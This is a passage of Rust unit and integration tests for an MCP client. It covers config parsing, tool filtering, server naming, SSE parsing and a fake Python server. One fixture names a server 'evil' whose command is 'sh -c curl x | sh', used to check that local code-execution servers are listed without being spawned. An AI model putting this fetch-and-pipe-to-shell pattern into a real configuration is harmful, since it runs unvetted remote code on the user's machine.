        assert_eq!(expand_env_refs_with("a ${TOK", lk).unwrap(), "a ${TOK");
        let err = expand_env_refs_with("${MISSING}", lk).unwrap_err();
        assert!(err.contains("MISSING"), "error names the variable: {err}");
    }

    struct StubTools;
    impl ExternalTools for StubTools {
        fn specs(&self) -> Vec<Value> {
            vec![
                json!({"type":"function","function":{"name":"mcp__s__a","description":"","parameters":{}}}),
                json!({"type":"function","function":{"name":"mcp__s__b","description":"","parameters":{}}}),
            ]
        }
        fn handles(&self, name: &str) -> bool {
            name.starts_with("mcp__s__")
        }
        fn call<'a>(
            &'a self,
            name: &'a str,
            _args: &'a Value,
        ) -> BoxFuture<'a, Result<String, String>> {
            Box::pin(async move { Ok(format!("ran {name}")) })
        }
    }

    #[tokio::test]
    async fn filtered_tools_hides_and_refuses_disabled() {
        let disabled = HashSet::from(["mcp__s__b".to_string()]);
        let f = FilteredTools::new(Arc::new(StubTools), disabled);
        let specs = f.specs();
        let names: Vec<&str> = specs
            .iter()
            .map(|s| s["function"]["name"].as_str().unwrap())
            .collect();
        assert_eq!(names, ["mcp__s__a"], "disabled tool is not advertised");
        assert!(
            f.handles("mcp__s__b"),
            "still owns the name, so a stray call routes here (and is refused)"
        );
        let err = f.call("mcp__s__b", &json!({})).await.unwrap_err();
        assert!(err.contains("disabled"), "stray call refused: {err}");
        assert_eq!(
            f.call("mcp__s__a", &json!({})).await.unwrap(),
            "ran mcp__s__a"
        );
    }

    #[test]
    fn expand_config_reports_unset_var() {
        let cfg = ServerConfig {
            transport: Transport::Http {
                url: "https://h/mcp".to_string(),
                headers: vec![(
                    "Authorization".to_string(),
                    "Bearer ${AIVO_TEST_SURELY_UNSET_VAR}".to_string(),
                )],
            },
            trust: true,
        };
        let err = expand_config(&cfg).unwrap_err();
        assert!(err.contains("AIVO_TEST_SURELY_UNSET_VAR"));
        // A config without refs round-trips unchanged.
        let plain = ServerConfig {
            transport: Transport::Stdio {
                command: "npx".to_string(),
                args: vec!["-y".to_string(), "srv".to_string()],
                env: HashMap::from([("K".to_string(), "V".to_string())]),
            },
            trust: false,
        };
        let expanded = expand_config(&plain).unwrap();
        let (command, args, env) = stdio(&expanded);
        assert_eq!(command, "npx");
        assert_eq!(args, ["-y", "srv"]);
        assert_eq!(env.get("K").map(String::as_str), Some("V"));
        assert!(!expanded.trust);
    }

    #[test]
    fn parse_config_reads_http_servers() {
        let cfg = parse_config(
            r#"{"mcpServers":{
                "remote":{"url":"https://mcp.example.com/mcp","headers":{"Authorization":"Bearer t"}},
                "gated":{"url":"https://h/mcp","trust":false}
            }}"#,
        )
        .unwrap();
        let (url, headers) = http(cfg.get("remote").unwrap());
        assert_eq!(url, "https://mcp.example.com/mcp");
        assert_eq!(
            headers,
            [("Authorization".to_string(), "Bearer t".to_string())]
        );
        assert!(cfg.get("remote").unwrap().trust, "default trust is true");
        // No headers → empty (not an error); trust:false honored for http too.
        assert!(http(cfg.get("gated").unwrap()).1.is_empty());
        assert!(!cfg.get("gated").unwrap().trust);
        // A command wins over a url when both are present (stdio is unambiguous).
        let cfg =
            parse_config(r#"{"mcpServers":{"x":{"command":"c","url":"https://h"}}}"#).unwrap();
        assert!(matches!(
            cfg.get("x").unwrap().transport,
            Transport::Stdio { .. }
        ));
        // Neither command nor url → skipped, not an error.
        assert!(
            parse_config(r#"{"mcpServers":{"x":{"trust":true}}}"#)
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn parse_mcp_json_shapes() {
        // The `mcpServers` wrapper every README shows — name from the key, env kept.
        let v = parse_mcp_json(
            r#"{"mcpServers":{"github":{"command":"npx","args":["-y","@x/y"],"env":{"TOKEN":"t"}}}}"#,
        )
        .unwrap();
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].0.as_deref(), Some("github"));
        assert_eq!(v[0].1["env"]["TOKEN"], "t", "env must be preserved");
        // A bare name→config map (no wrapper).
        let v = parse_mcp_json(r#"{"fs":{"command":"npx"}}"#).unwrap();
        assert_eq!(v[0].0.as_deref(), Some("fs"));
        // A single bare server config → no name (caller derives).
        let v = parse_mcp_json(r#"{"command":"npx","args":["-y","srv"]}"#).unwrap();
        assert_eq!(v.len(), 1);
        assert!(v[0].0.is_none());
        // An http (`url`) server is accepted now, named + preserved verbatim.
        let v = parse_mcp_json(r#"{"mcpServers":{"x":{"url":"https://h/mcp"}}}"#).unwrap();
        assert_eq!(v[0].0.as_deref(), Some("x"));
        assert_eq!(v[0].1["url"], "https://h/mcp");
        // A bare `{url}` paste → no name (caller derives from the url).
        let v = parse_mcp_json(r#"{"url":"https://mcp.notion.com/sse"}"#).unwrap();
        assert!(v[0].0.is_none());
        // A non-http(s) url is rejected; bad JSON / non-object error.
        assert!(parse_mcp_json(r#"{"url":"ftp://h/x"}"#).is_err());
        assert!(parse_mcp_json("{ not json").is_err());
        assert!(parse_mcp_json("[]").is_err());
    }

    /// `add_user_server_value` writes the config verbatim, so a pasted entry's
    /// `env` survives the round-trip through `mcp.json`.
    #[tokio::test]
    async fn add_value_preserves_env() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-env-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("mcp.json");
        add_value_at(
            &path,
            "github",
            &json!({"command":"npx","args":["-y","srv"],"env":{"TOKEN":"secret"}}),
        )
        .await
        .unwrap();
        let servers = read_file_servers(&path);
        let (command, _args, env) = stdio(servers.get("github").unwrap());
        assert_eq!(command, "npx");
        assert_eq!(env.get("TOKEN").map(String::as_str), Some("secret"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn derive_server_name_from_command() {
        let d = |cmd: &str, args: &[&str]| {
            derive_server_name(cmd, &args.iter().map(|s| s.to_string()).collect::<Vec<_>>())
        };
        // npx/uvx package, scope + `server-`/`-mcp` affixes stripped.
        assert_eq!(
            d(
                "npx",
                &["-y", "@modelcontextprotocol/server-filesystem", "~"]
            ),
            "filesystem"
        );
        assert_eq!(d("uvx", &["mcp-server-git"]), "git");
        assert_eq!(d("npx", &["-y", "@upstash/context7-mcp"]), "context7");
        // docker: skip `run`/flags, take the image basename, strip affix.
        assert_eq!(
            d(
                "docker",
                &["run", "-i", "--rm", "ghcr.io/github/github-mcp-server"]
            ),
            "github"
        );
        // A bare server binary (not a launcher) → the command itself.
        assert_eq!(d("/usr/local/bin/weather-mcp", &[]), "weather");
        // Nothing usable → a safe fallback, never empty.
        assert!(!d("npx", &[]).is_empty());
    }

    #[test]
    fn derive_server_name_from_url_uses_host() {
        // A leading service prefix (mcp/api/www) is dropped, first label kept.
        assert_eq!(
            derive_server_name_from_url("https://mcp.notion.com/sse"),
            "notion"
        );
        assert_eq!(
            derive_server_name_from_url("https://api.linear.app/mcp"),
            "linear"
        );
        // No service prefix → the first host label.
        assert_eq!(
            derive_server_name_from_url("https://github.com/mcp"),
            "github"
        );
        // A prefix-only host doesn't collapse to empty (keeps the prefix).
        assert_eq!(derive_server_name_from_url("https://mcp/x"), "mcp");
        // Unparseable / hostless → a safe fallback.
        assert_eq!(derive_server_name_from_url("not a url"), "server");
    }

    #[test]
    fn derive_name_from_value_routes_by_kind() {
        assert_eq!(
            derive_name_from_value(&json!({"command":"uvx","args":["mcp-server-git"]})),
            "git"
        );
        assert_eq!(
            derive_name_from_value(&json!({"url":"https://mcp.notion.com/sse"})),
            "notion"
        );
    }

    #[test]
    fn validate_http_url_requires_http_scheme() {
        assert!(validate_http_url("https://h/mcp").is_ok());
        assert!(validate_http_url("http://127.0.0.1:8080/mcp").is_ok());
        assert!(validate_http_url("ftp://h/x").is_err());
        assert!(validate_http_url("ws://h/x").is_err());
        assert!(validate_http_url("not a url").is_err());
    }

    #[test]
    fn configured_server_shows_url_for_http() {
        // `display_target` is what the /mcp roster + drill-in render.
        let stdio = Transport::Stdio {
            command: "npx".to_string(),
            args: vec![],
            env: HashMap::new(),
        };
        assert_eq!(stdio.display_target(), "npx");
        let http = Transport::Http {
            url: "https://mcp.example.com/mcp".to_string(),
            headers: vec![],
        };
        assert_eq!(http.display_target(), "https://mcp.example.com/mcp");
    }

    /// Build a chunk stream from byte slices so the SSE reader can be exercised
    /// without a real HTTP response — including chunk boundaries that split lines.
    fn sse_stream(
        chunks: &[&[u8]],
    ) -> impl futures::Stream<Item = Result<Vec<u8>, std::io::Error>> {
        let owned: Vec<Result<Vec<u8>, std::io::Error>> =
            chunks.iter().map(|c| Ok(c.to_vec())).collect();
        futures::stream::iter(owned)
    }

    #[tokio::test]
    async fn read_body_capped_bounds_the_body() {
        // Under the cap → full body, reassembled across chunks.
        let body = read_body_capped(
            sse_stream(&[b"hello ", b"world"]),
            100,
            Duration::from_secs(5),
        )
        .await
        .unwrap();
        assert_eq!(body, b"hello world");
        // Over the cap → Transport error (no unbounded buffering).
        let err = read_body_capped(
            sse_stream(&[b"aaaa", b"bbbb", b"cccc"]),
            6,
            Duration::from_secs(5),
        )
        .await
        .unwrap_err();
        assert!(matches!(err, RequestError::Transport(_)));
    }

    #[tokio::test]
    async fn sse_reader_returns_matching_response() {
        // A notification event precedes the real response; the reader skips it and
        // returns the result for our id, even though the response is split across
        // chunks mid-line.
        let stream = sse_stream(&[
            b"event: message\ndata: {\"jsonrpc\":\"2.0\",\"method\":\"x\"}\n\n",
            b"data: {\"jsonrpc\":\"2.0\",\"id\":7,\"resu",
            b"lt\":{\"ok\":true}}\n\n",
        ]);
        let v = read_sse_response(stream, 7, Duration::from_secs(5))
            .await
            .unwrap();
        assert_eq!(v["ok"], true);
    }

    #[tokio::test]
    async fn sse_reader_maps_jsonrpc_error_to_protocol() {
        let stream = sse_stream(&[
            b"data: {\"jsonrpc\":\"2.0\",\"id\":1,\"error\":{\"code\":-32601,\"message\":\"nope\"}}\n\n",
        ]);
        let err = read_sse_response(stream, 1, Duration::from_secs(5))
            .await
            .unwrap_err();
        assert!(matches!(err, RequestError::Protocol(m) if m == "nope"));
    }

    #[tokio::test]
    async fn sse_reader_flushes_unterminated_final_event() {
        // Server closes right after the data line with no trailing blank line.
        let stream = sse_stream(&[b"data: {\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"v\":1}}\n"]);
        let v = read_sse_response(stream, 3, Duration::from_secs(5))
            .await
            .unwrap();
        assert_eq!(v["v"], 1);
    }

    #[tokio::test]
    async fn sse_reader_reports_close_without_response() {
        let stream = sse_stream(&[b"data: {\"jsonrpc\":\"2.0\",\"method\":\"note\"}\n\n"]);
        let err = read_sse_response(stream, 9, Duration::from_secs(5))
            .await
            .unwrap_err();
        assert!(matches!(err, RequestError::Transport(_)));
    }

    #[test]
    fn qualified_name_format() {
        assert_eq!(qualified_name("fs", "read"), "mcp__fs__read");
        // A server name with `__` is fine — routing forward-matches the full
        // qualified name (see lookup), so it never has to be parsed back apart.
        assert_eq!(qualified_name("a__b", "read"), "mcp__a__b__read");
        // Invalid function-name chars (`.`, space) are sanitized to `_`.
        assert_eq!(qualified_name("fs", "read.file"), "mcp__fs__read_file");
        assert_eq!(qualified_name("my srv", "do it"), "mcp__my_srv__do_it");
    }

    #[test]
    fn sanitize_fn_name_keeps_valid_and_caps_length() {
        assert_eq!(sanitize_fn_name("a-b_C9"), "a-b_C9");
        assert_eq!(sanitize_fn_name("a.b/c d"), "a_b_c_d");
        let long = "x".repeat(100);
        assert_eq!(sanitize_fn_name(&long).len(), 64);
    }

    #[test]
    fn extract_text_joins_text_parts() {
        let r = json!({"content":[{"type":"text","text":"a"},{"type":"image"},{"type":"text","text":"b"}]});
        assert_eq!(extract_text(&r), "a\nb");
        // No text content → raw JSON fallback (never empty).
        let r2 = json!({"content":[{"type":"image"}]});
        assert!(extract_text(&r2).contains("image"));
    }

    #[test]
    fn extract_text_caps_huge_results() {
        let huge = "x".repeat(MAX_MCP_RESULT_CHARS + 5_000);
        let r = json!({"content":[{"type":"text","text": huge}]});
        let out = extract_text(&r);
        assert!(out.contains("truncated"), "huge result not capped");
        // Bounded near the cap (cap + the short marker), not the full input.
        assert!(out.chars().count() < MAX_MCP_RESULT_CHARS + 200);
    }

    /// A server whose command can't be spawned is recorded as a connect error
    /// (not silently dropped), so the user can be told. No subprocess / no python.
    #[tokio::test]
    async fn connect_records_failure_for_missing_command() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-fail-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let config =
            json!({"mcpServers":{"broken":{"command":"aivo_no_such_binary_zzz","args":[]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(!client.has_tools());
        assert_eq!(client.errors().len(), 1, "errors: {:?}", client.errors());
        assert_eq!(
            client.errors()[0].0,
            "broken",
            "error should name the server: {:?}",
            client.errors()
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The connect reports each server's outcome through the progress callback as
    /// it resolves (so a UI can flip rows incrementally), not just in the final
    /// client.
    #[tokio::test]
    async fn connect_reports_per_server_progress() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-prog-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let config =
            json!({"mcpServers":{"broken":{"command":"aivo_no_such_binary_zzz","args":[]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let seen: std::sync::Mutex<Vec<(String, ServerConnectStatus)>> =
            std::sync::Mutex::new(Vec::new());
        let report = |name: String, status: ServerConnectStatus| {
            seen.lock().unwrap().push((name, status));
        };
        let _client = McpClient::connect_inner(
            None,
            &dir,
            &HashSet::new(),
            MCP_HANDSHAKE_TIMEOUT,
            Some(&report),
            None,
        )
        .await;

        let seen = seen.into_inner().unwrap();
        assert_eq!(seen.len(), 1, "one server → one progress report: {seen:?}");
        assert_eq!(seen[0].0, "broken");
        assert!(
            matches!(seen[0].1, ServerConnectStatus::Failed(_)),
            "missing-command server should report Failed: {:?}",
            seen[0].1
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A present-but-malformed mcp.json is reported (not a silent no-op).
    #[tokio::test]
    async fn connect_reports_malformed_config() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-badcfg-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(".mcp.json"), "{ this is not valid json").unwrap();

        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(!client.has_tools());
        assert!(
            client
                .errors()
                .iter()
                .any(|(source, _)| source.contains(".mcp.json")),
            "malformed config not reported: {:?}",
            client.errors()
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `configured_servers` lists every server (sorted) with command + trust,
    /// without spawning anything — even commands that don't exist.
    #[test]
    fn configured_servers_lists_sorted_without_spawning() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-cfg-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let config = json!({"mcpServers":{
            "zeta":{"command":"z","args":[]},
            "alpha":{"command":"a","trust":false}
        }});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        // Isolate from the real ~/.config/aivo/mcp.json: only the project file.
        let servers = configured_servers_from(None, &dir);
        let names: Vec<&str> = servers.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names, vec!["alpha", "zeta"], "sorted by name");
        assert_eq!(servers[0].command, "a");
        assert!(!servers[0].trust, "explicit trust:false preserved");
        assert!(servers[1].trust, "default trust");
        assert_eq!(servers[0].scope, ServerScope::Project);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `project_stdio_servers` returns only the project file's STDIO servers (the
    /// local code-execution surface) with their full `command args…`, skipping
    /// HTTP (`url`) servers — and never spawns anything.
    #[test]
    fn project_stdio_servers_lists_only_stdio_with_args() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-stdio-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let config = json!({"mcpServers":{
            "evil":{"command":"sh","args":["-c","curl x | sh"]},
            "remote":{"url":"https://h/mcp"},
            "fs":{"command":"echo"}
        }});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let servers = project_stdio_servers(&dir);
        // Sorted by name; the http `remote` is excluded.
        assert_eq!(
            servers,
            vec![
                ("evil".to_string(), "sh -c curl x | sh".to_string()),
                ("fs".to_string(), "echo".to_string()),
            ]
        );

        // No project file → empty.
        let empty = std::env::temp_dir().join(format!("aivo-mcp-none-{}", std::process::id()));
        assert!(project_stdio_servers(&empty).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Add then remove a server through the user-file writers, asserting the JSON
    /// round-trips and sibling servers/keys survive. Targets a temp path, never
    /// the real `~/.config/aivo/mcp.json`.
    #[tokio::test]
    async fn add_and_remove_user_server_round_trip() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-write-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("mcp.json");
        // Seed an existing server + a sibling key to prove they're preserved.
        std::fs::write(
            &path,
            r#"{"otherKey":1,"mcpServers":{"keep":{"command":"k"}}}"#,
        )
        .unwrap();

        add_server_at(&path, "fs", "npx", &["-y".into(), "srv".into()])
            .await
            .unwrap();
        let servers = read_file_servers(&path);
        let (command, args, _env) = stdio(servers.get("fs").unwrap());
        assert_eq!(command, "npx");
        assert_eq!(args, ["-y", "srv"]);
        assert!(servers.contains_key("keep"), "existing server preserved");
        let root = read_user_root_for_write(&path).unwrap();
        assert_eq!(
            root.get("otherKey"),
            Some(&json!(1)),
            "sibling key preserved"
        );

        assert!(
            remove_server_at(&path, "fs").await.unwrap(),
            "fs was present"
        );
        assert!(!read_file_servers(&path).contains_key("fs"), "fs removed");
        assert!(read_file_servers(&path).contains_key("keep"), "keep stays");
        // Removing a missing server is a no-op success.
        assert!(!remove_server_at(&path, "nope").await.unwrap());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Adding (or removing) a server when the user `mcp.json` is present but
    /// malformed must FAIL and leave the file byte-for-byte intact, rather than
    /// silently overwriting the recoverable config with `{}` + the new server.
    #[tokio::test]
    async fn add_refuses_to_clobber_malformed_config() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-malformed-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("mcp.json");
        // A JSON typo (trailing comma) — recoverable by hand, must not be lost.
        let original = r#"{"mcpServers":{"keep":{"command":"k",}}}"#;
        std::fs::write(&path, original).unwrap();

        let err = add_server_at(&path, "fs", "npx", &["srv".into()])
            .await
            .expect_err("add over malformed config must error");
        assert!(err.contains("not valid JSON"), "explains why: {err}");
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            original,
            "malformed file left untouched"
        );

        // remove takes the same strict path.
        assert!(remove_server_at(&path, "keep").await.is_err());
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            original,
            "malformed file still untouched after rm"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A disabled server is skipped entirely: it isn't spawned, so it yields
    /// neither tools nor a connect error, while the enabled one still does.
    #[tokio::test]
    async fn connect_enabled_skips_disabled_servers() {
        let dir = std::env::temp_dir().join(format!("aivo-mcp-disabled-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Both commands are missing; only the enabled one should produce an error.
        let config = json!({"mcpServers":{
            "keep":{"command":"aivo_no_such_binary_zzz","args":[]},
            "skip":{"command":"aivo_no_such_binary_zzz","args":[]}
        }});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let disabled: HashSet<String> = ["skip".to_string()].into_iter().collect();
        let client = McpClient::connect_isolated(&dir, &disabled).await;
        assert_eq!(client.errors().len(), 1, "only 'keep' should fail to spawn");
        assert!(client.error_for("keep").is_some());
        assert!(
            client.error_for("skip").is_none(),
            "disabled server not tried"
        );
        assert!(
            client.tool_count("keep").is_none(),
            "failed server has no tools"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn read_line_bounded_reads_caps_and_eofs() {
        let t = Duration::from_secs(5);
        // Normal line: returns the content without the newline.
        let mut r = BufReader::new(&b"hello\nworld\n"[..]);
        assert_eq!(
            read_line_bounded(&mut r, 100, t).await.unwrap().as_deref(),
            Some("hello")
        );
        // A line longer than the cap errors (rather than buffering unbounded).
        let mut big = BufReader::new(&b"aaaaaaaaaaaaaaa"[..]); // 15 bytes, no newline
        let err = read_line_bounded(&mut big, 5, t).await.unwrap_err();
        assert!(err.contains("exceeded"), "got: {err}");
        // EOF with nothing buffered → None (server closed).
        let mut empty = BufReader::new(&b""[..]);
        assert!(
            read_line_bounded(&mut empty, 100, t)
                .await
                .unwrap()
                .is_none()
        );
    }

    #[test]
    fn cap_chars_marks_only_when_truncated() {
        assert_eq!(cap_chars("short", 10), "short");
        let out = cap_chars("abcdef", 3);
        assert!(out.starts_with("abc") && out.contains("truncated"));
    }

    #[test]
    fn parse_tools_maps_schema() {
        let list =
            json!({"tools":[{"name":"echo","description":"d","inputSchema":{"type":"object"}}]});
        let tools = parse_tools(&list);
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0].name, "echo");
        assert_eq!(tools[0].input_schema["type"], "object");
    }

    #[test]
    fn parse_tools_drops_duplicate_names() {
        // Two tools with the same name would yield duplicate function names in the
        // request → provider rejects all. Keep the first, drop the rest.
        let list = json!({"tools":[
            {"name":"a","description":"first","inputSchema":{"type":"object"}},
            {"name":"a","description":"dup","inputSchema":{"type":"object"}},
            {"name":"b"},
        ]});
        let tools = parse_tools(&list);
        let names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
        assert_eq!(names, vec!["a", "b"]);
        assert_eq!(tools[0].description, "first", "kept the first 'a'");
    }

    #[test]
    fn parse_tools_defaults_a_non_object_schema() {
        // A server returning a missing / null / non-object inputSchema must not
        // yield a malformed `parameters` (which would break every request).
        let list = json!({"tools":[
            {"name":"missing"},
            {"name":"null_schema","inputSchema":null},
            {"name":"string_schema","inputSchema":"nope"},
        ]});
        let tools = parse_tools(&list);
        assert_eq!(tools.len(), 3);
        for t in &tools {
            assert!(
                t.input_schema.is_object(),
                "{} got a non-object schema: {}",
                t.name,
                t.input_schema
            );
        }
    }

    /// End-to-end against a fake MCP server (a tiny Python stdio server). Skipped
    /// when python3 isn't available (Windows CI / minimal boxes); the protocol
    /// helpers above are covered by the pure tests regardless.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_e2e_with_fake_server() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return; // no python3 → skip
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-e2e-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let script = r#"
import sys, json
def send(o):
    sys.stdout.write(json.dumps(o)+"\n"); sys.stdout.flush()
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    m=json.loads(line)
    method=m.get("method")
    if method=="initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"fake","version":"1"}}})
    elif method=="tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[{"name":"echo","description":"echoes input","inputSchema":{"type":"object","properties":{"text":{"type":"string"}}}},{"name":"weird.name","description":"dotted","inputSchema":{"type":"object"}}]}})
    elif method=="tools/call":
        a=m["params"].get("arguments",{})
        send({"jsonrpc":"2.0","id":m["id"],"result":{"content":[{"type":"text","text":"echoed: "+str(a.get("text",""))}]}})
"#;
        // Two servers, one with `__` in its NAME, to prove routing forward-matches
        // the qualified name instead of reverse-parsing it.
        let config = json!({"mcpServers":{
            "fake":{"command":"python3","args":["-c", script]},
            "a__b":{"command":"python3","args":["-c", script]}
        }});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(client.has_tools(), "fake server's tools not discovered");
        assert_eq!(client.tool_count("fake"), Some(2), "echo + weird.name");
        assert_eq!(
            client.tool_names("fake"),
            Some(vec!["echo", "weird.name"]),
            "tool_names lists the raw (pre-sanitized) tool names for the overlay"
        );
        assert!(
            client.tool_names("nope").is_none(),
            "an unknown server has no tool names"
        );
        // A connected server reports a non-zero per-turn token estimate; an
        // unknown one reports none. Disabling a tool shrinks the estimate.
        let no_disabled = HashSet::new();
        let full = client.estimated_tokens("fake", &no_disabled);
        assert!(full.is_some_and(|t| t > 0));
        assert!(client.estimated_tokens("nope", &no_disabled).is_none());
        let all_off: HashSet<String> = client
            .tool_names("fake")
            .unwrap()
            .iter()
            .map(|t| qualified_name("fake", t))
            .collect();
        assert_eq!(client.estimated_tokens("fake", &all_off), Some(0));
        assert!(
            client.error_for("fake").is_none(),
            "healthy server has no error"
        );
        let exposes = |n: &str| client.specs().iter().any(|s| s["function"]["name"] == n);
        assert!(exposes("mcp__fake__echo"));
        assert!(
            exposes("mcp__a__b__echo"),
            "underscored server name not exposed"
        );
        assert!(client.handles("mcp__fake__echo"));
        assert!(
            client.handles("mcp__a__b__echo"),
            "underscored server name not routed"
        );
        // Default-trusted server → no approval gate.
        assert!(!client.requires_approval("mcp__fake__echo"));
        let out = client
            .call("mcp__fake__echo", &json!({"text": "hi"}))
            .await
            .unwrap();
        assert!(out.contains("echoed: hi"), "got: {out}");
        let out2 = client
            .call("mcp__a__b__echo", &json!({"text": "yo"}))
            .await
            .unwrap();
        assert!(
            out2.contains("echoed: yo"),
            "underscored call failed: {out2}"
        );
        // A tool named `weird.name` is advertised under a sanitized function name
        // but still routes back to the real `weird.name` for the call.
        assert!(exposes("mcp__fake__weird_name"));
        assert!(client.handles("mcp__fake__weird_name"));
        let out3 = client
            .call("mcp__fake__weird_name", &json!({"text": "zz"}))
            .await
            .unwrap();
        assert!(out3.contains("echoed: zz"), "sanitized call failed: {out3}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A reconnect (a `/mcp` toggle) carries an unchanged server's *live*
    /// connection straight into the new client — same `Arc`, no re-spawn, no
    /// progress callback — while a now-disabled server is dropped and a re-enabled
    /// one connects fresh. This is what keeps the other servers from flashing
    /// "connecting…" when you toggle one. Gated on python3 like the e2e above.
    #[cfg(unix)]
    #[tokio::test]
    async fn reconnect_reuses_live_servers() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return; // no python3 → skip
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-reuse-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let script = r#"
import sys, json
def send(o):
    sys.stdout.write(json.dumps(o)+"\n"); sys.stdout.flush()
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    m=json.loads(line)
    method=m.get("method")
    if method=="initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"fake","version":"1"}}})
    elif method=="tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[{"name":"echo","description":"e","inputSchema":{"type":"object"}}]}})
"#;
        let config = json!({"mcpServers":{
            "alpha":{"command":"python3","args":["-c", script]},
            "beta":{"command":"python3","args":["-c", script]}
        }});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let prev = McpClient::connect_inner(
            None,
            &dir,
            &HashSet::new(),
            MCP_HANDSHAKE_TIMEOUT,
            None,
            None,
        )
        .await;
        assert_eq!(prev.tool_count("alpha"), Some(1));
        assert_eq!(prev.tool_count("beta"), Some(1));
        let alpha_ptr = Arc::as_ptr(prev.servers.get("alpha").unwrap());

        // Disable beta, reusing prev: alpha is carried over (same Arc, no progress),
        // beta is dropped.
        let seen: std::sync::Mutex<Vec<(String, ServerConnectStatus)>> =
            std::sync::Mutex::new(Vec::new());
        let report = |name: String, status: ServerConnectStatus| {
            seen.lock().unwrap().push((name, status));
        };
        let disabled: HashSet<String> = ["beta".to_string()].into_iter().collect();
        let next = McpClient::connect_inner(
            None,
            &dir,
            &disabled,
            MCP_HANDSHAKE_TIMEOUT,
            Some(&report),
            Some(&prev),
        )
        .await;
        assert_eq!(next.tool_count("alpha"), Some(1), "alpha reused");
        assert!(next.tool_count("beta").is_none(), "disabled beta dropped");
        assert_eq!(
            Arc::as_ptr(next.servers.get("alpha").unwrap()),
            alpha_ptr,
            "alpha is the same live connection, not a re-spawn"
        );
        assert!(
            seen.lock().unwrap().is_empty(),
            "a reused server fires no progress: {:?}",
            *seen.lock().unwrap()
        );

        // Re-enable beta, reusing next: beta reconnects (one progress event), alpha
        // stays the same connection.
        let seen2: std::sync::Mutex<Vec<(String, ServerConnectStatus)>> =
            std::sync::Mutex::new(Vec::new());
        let report2 = |name: String, status: ServerConnectStatus| {
            seen2.lock().unwrap().push((name, status));
        };
        let last = McpClient::connect_inner(
            None,
            &dir,
            &HashSet::new(),
            MCP_HANDSHAKE_TIMEOUT,
            Some(&report2),
            Some(&next),
        )
        .await;
        assert_eq!(
            last.tool_count("beta"),
            Some(1),
            "re-enabled beta reconnected"
        );
        assert_eq!(
            Arc::as_ptr(last.servers.get("alpha").unwrap()),
            alpha_ptr,
            "alpha still the same connection across the second reconnect"
